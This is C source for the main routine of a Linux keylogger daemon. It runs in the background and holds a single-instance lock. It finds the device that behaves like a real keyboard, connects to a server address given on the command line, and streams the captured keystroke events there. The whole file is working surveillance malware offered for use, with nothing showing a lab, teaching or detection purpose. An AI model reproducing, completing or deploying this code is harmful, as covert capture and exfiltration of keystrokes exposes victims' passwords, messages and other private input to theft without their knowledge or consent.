/**Developed by Fabio Cinicolo **/

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <syslog.h>
#include <stdio.h>
#include <fcntl.h>
#include "daemon.h"
#include "keylogger.h"

int main(int argc, char *argv[])
{
    int keyboard;
    int server;
    int flock;
    int is_single_instance;
    int timeout;
    int *keyboards;
    int num_keyboards;
    char *ip;
    short port;

    if (argc != 4)
        fprintf(stderr, "Usage: ./keylogger-daemon ip port timeout\n"), exit(EXIT_FAILURE);

    if (!daemonize()) /* Convert process to daemon */
        fprintf(stderr, "Couldn't daemonize process\n"), exit(EXIT_FAILURE);

    if (daemonAlreadyRunning(&flock)) /* If another instance of keylogger is already running, or could not acquire write lock then we exit */
        exit(EXIT_FAILURE);

    if (!(keyboards = findKeyboards(PATH, &num_keyboards))) /* Looking for possible keyboard devices */
        exit(EXIT_FAILURE);

    timeout = atoi(argv[3]);

    if (!(findRealKeyboard(keyboards, num_keyboards, timeout, &keyboard))) /* Picking first device that really acts like a keyboard (we are not interested in false positives like Joypads). */
        exit(EXIT_FAILURE);                                                /* We will wait for $timeout milliseconds to have the user digit on the actual keyboard and take its file descriptor. */

    for (int i = 0; i < num_keyboards; i++) /* Freeing up keyboards descriptors */
        if (keyboards[i] != keyboard)
            close(keyboards[i]);
    free(keyboards);

    ip = argv[1];
    port = atoi(argv[2]);
    if (!(server = openConnectionWithServer(ip, port))) /* Connecting with server */
        exit(EXIT_FAILURE);

    startKeylogger(keyboard, server); /* Reading from keyboard device and sending events to server */

    close(flock); /* Closing lock file */
    exit(EXIT_SUCCESS);
}
